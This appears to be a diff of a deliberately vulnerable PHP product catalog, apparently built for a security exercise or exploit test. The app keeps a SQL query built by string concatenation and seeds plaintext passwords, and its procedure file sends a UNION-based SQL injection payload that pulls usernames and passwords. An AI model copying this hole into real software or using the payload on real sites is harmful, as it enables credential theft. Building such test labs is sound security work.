@@ -1,0 +1,228 @@
+--- initial/app/index.php
++++ attempt_1/app/index.php
+@@ -1,26 +1,61 @@
+ <?php
+-$db_host = '127.0.0.1';
+-$db_user = 'appuser';
+-$db_pass = 'AppPass123!';
+-$db_name = 'shopdb';
++// Database setup - initialize SQLite DB with products and users tables
++$db_path = '/var/db/app.db';
+ 
+-$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
+-if ($conn->connect_error) {
+-    die('Connection failed');
++try {
++    $pdo = new PDO('sqlite:' . $db_path);
++    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
++
++    // Create tables if they don't exist
++    $pdo->exec("CREATE TABLE IF NOT EXISTS products (
++        id INTEGER PRIMARY KEY AUTOINCREMENT,
++        name VARCHAR(255),
++        description VARCHAR(512)
++    )");
++
++    $pdo->exec("CREATE TABLE IF NOT EXISTS users (
++        id INTEGER PRIMARY KEY AUTOINCREMENT,
++        username VARCHAR(255),
++        password VARCHAR(255)
++    )");
++
++    // Seed products if empty
++    $count = $pdo->query("SELECT COUNT(*) FROM products")->fetchColumn();
++    if ($count == 0) {
++        $pdo->exec("INSERT INTO products (name, description) VALUES
++            ('Widget Alpha', 'A high-quality aluminum widget'),
++            ('Widget Beta', 'A durable plastic widget'),
++            ('Gadget Pro', 'Professional grade gadget'),
++            ('Gadget Lite', 'Entry-level gadget for home use'),
++            ('Component X', 'Industrial component with warranty')");
++    }
++
++    // Seed users if empty
++    $ucount = $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
++    if ($ucount == 0) {
++        $pdo->exec("INSERT INTO users (username, password) VALUES
++            ('admin', 'adminpass123'),
++            ('dbuser', 'Sup3rS3cr3t!'),
++            ('webmaster', 'webmaster2024')");
++    }
++
++} catch (Exception $e) {
++    die('DB init error: ' . $e->getMessage());
+ }
+ 
++// Handle search
++$search = isset($_GET['search']) ? $_GET['search'] : '';
+ $results = [];
+-$searched = false;
++$error = null;
+ 
+-if (isset($_GET['search'])) {
+-    $searched = true;
+-    $search = $_GET['search'];
++if ($search !== '') {
++    // VULNERABLE: direct string concatenation into SQL query - no sanitization
+     $query = "SELECT name, description FROM products WHERE name LIKE '%" . $search . "%'";
+-    $result = $conn->query($query);
+-    if ($result) {
+-        while ($row = $result->fetch_assoc()) {
+-            $results[] = $row;
+-        }
++    try {
++        $stmt = $pdo->query($query);
++        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
++    } catch (Exception $e) {
++        $error = $e->getMessage();
+     }
+ }
+ ?>
+@@ -28,34 +63,44 @@
+ <html lang="en">
+ <head>
+     <meta charset="UTF-8">
+-    <title>ShopLocal - Product Catalog</title>
++    <meta name="viewport" content="width=device-width, initial-scale=1.0">
++    <title>Product Catalog</title>
+     <style>
+-        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
++        body { font-family: Arial, sans-serif; margin: 40px; background: #f4f4f4; }
+         h1 { color: #333; }
+-        .search-box { margin: 20px 0; }
+-        .search-box input[type=text] { padding: 8px; width: 300px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px; }
+-        .search-box input[type=submit] { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
++        form { margin-bottom: 20px; }
++        input[type=text] { padding: 8px; width: 300px; border: 1px solid #ccc; border-radius: 4px; }
++        input[type=submit] { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
++        input[type=submit]:hover { background: #0056b3; }
+         table { border-collapse: collapse; width: 100%; background: white; }
+-        th { background: #007bff; color: white; padding: 10px; text-align: left; }
+-        td { padding: 10px; border-bottom: 1px solid #ddd; }
+-        tr:hover { background: #f0f0f0; }
+-        .no-results { color: #888; margin-top: 10px; }
++        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
++        th { background: #007bff; color: white; }
++        tr:nth-child(even) { background: #f9f9f9; }
++        .error { color: red; background: #ffe0e0; padding: 10px; border-radius: 4px; margin-bottom: 10px; }
++        .no-results { color: #666; }
+     </style>
+ </head>
+ <body>
+-    <h1>ShopLocal Product Catalog</h1>
+-    <div class="search-box">
+-        <form method="GET" action="/index.php">
+-            <input type="text" name="search" placeholder="Search products..." value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search'], ENT_QUOTES) : ''; ?>">
+-            <input type="submit" value="Search">
+-        </form>
+-    </div>
+-    <?php if ($searched): ?>
+-    <h2>Search Results</h2>
++    <h1>Product Catalog</h1>
++    <form method="GET" action="/index.php">
++        <label for="search">Search Products:</label><br><br>
++        <input type="text" id="search" name="search" value="<?php echo htmlspecialchars($search, ENT_QUOTES); ?>" placeholder="Enter product name...">
++        <input type="submit" value="Search">
++    </form>
++
++    <?php if ($error): ?>
++    <div class="error"><strong>Database Error:</strong> <?php echo $error; ?></div>
++    <?php endif; ?>
++
++    <?php if ($search !== ''): ?>
++    <h2>Search Results for: "<?php echo htmlspecialchars($search, ENT_QUOTES); ?>"</h2>
+     <?php if (count($results) > 0): ?>
+     <table>
+         <thead>
+-            <tr><th>Name</th><th>Description</th></tr>
++            <tr>
++                <th>Product Name</th>
++                <th>Description</th>
++            </tr>
+         </thead>
+         <tbody>
+             <?php foreach ($results as $row): ?>
+@@ -70,7 +115,29 @@
+     <p class="no-results">No products found matching your search.</p>
+     <?php endif; ?>
+     <?php else: ?>
+-    <p>Enter a product name above to search our catalog.</p>
++    <h2>All Products</h2>
++    <?php
++    $all = $pdo->query("SELECT name, description FROM products")->fetchAll(PDO::FETCH_ASSOC);
++    ?>
++    <table>
++        <thead>
++            <tr>
++                <th>Product Name</th>
++                <th>Description</th>
++            </tr>
++        </thead>
++        <tbody>
++            <?php foreach ($all as $row): ?>
++            <tr>
++                <td><?php echo $row['name']; ?></td>
++                <td><?php echo $row['description']; ?></td>
++            </tr>
++            <?php endforeach; ?>
++        </tbody>
++    </table>
+     <?php endif; ?>
++
++    <br>
++    <p><em>Search the catalog by entering a product name above.</em></p>
+ </body>
+ </html>
+--- initial/app/setup_db.sh
++++ attempt_1/app/setup_db.sh
+@@ -1,18 +0,0 @@
+-#!/bin/bash
+-set -e
+-service mysql start
+-sleep 5
+-mysql -u root <<'SQLEOF'
+-CREATE DATABASE IF NOT EXISTS shopdb;
+-CREATE USER IF NOT EXISTS 'appuser'@'127.0.0.1' IDENTIFIED BY 'AppPass123!';
+-GRANT SELECT, INSERT, UPDATE ON shopdb.* TO 'appuser'@'127.0.0.1';
+-GRANT SELECT ON information_schema.* TO 'appuser'@'127.0.0.1';
+-GRANT SELECT ON mysql.user TO 'appuser'@'127.0.0.1';
+-FLUSH PRIVILEGES;
+-USE shopdb;
+-CREATE TABLE IF NOT EXISTS products (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255), description VARCHAR(255));
+-CREATE TABLE IF NOT EXISTS users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(100), password VARCHAR(255), email VARCHAR(255), role VARCHAR(50));
+-INSERT INTO products (name, description) VALUES ('Laptop Pro 15', 'High-performance laptop with 16GB RAM'), ('Wireless Mouse', 'Ergonomic wireless mouse with long battery life'), ('USB-C Hub', '7-in-1 USB-C hub with HDMI and power delivery'), ('Mechanical Keyboard', 'Tactile mechanical keyboard with RGB lighting'), ('4K Monitor', '27-inch 4K IPS display with USB-C connectivity');
+-INSERT INTO users (username, password, email, role) VALUES ('admin', 'Summer2024!', 'admin@shoplocal.internal', 'administrator'), ('dbuser', 'Str0ngDBPass#99', 'dbuser@shoplocal.internal', 'db_operator'), ('alice', 'alice_pass_123', 'alice@shoplocal.internal', 'user'), ('bob', 'hunter2', 'bob@shoplocal.internal', 'user');
+-SQLEOF
+-echo 'Database setup complete'
+--- initial/procedure.yaml
++++ attempt_1/procedure.yaml
+@@ -4,23 +4,23 @@
+     headers: {}
+     method: GET
+     type: http_request
+-    url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
++    url: http://${target_host}:${target_port}/index.php
+   expect:
+-    body_contains: admin
++    status: 200
+   outputs: {}
+   session: null
+-  step_id: exploit_sqli_union
++  step_id: verify_app_running
+   timeout: 10
+ - action:
+     body: null
+     headers: {}
+     method: GET
+     type: http_request
+-    url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
++    url: http://${target_host}:${target_port}/index.php?search=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-
+   expect:
+-    body_contains: Summer2024!
++    body_contains: adminpass123
+   outputs: {}
+   session: null
+-  step_id: verify_credentials
++  step_id: exploit_sqli_union
+   timeout: 10
+ sessions: []
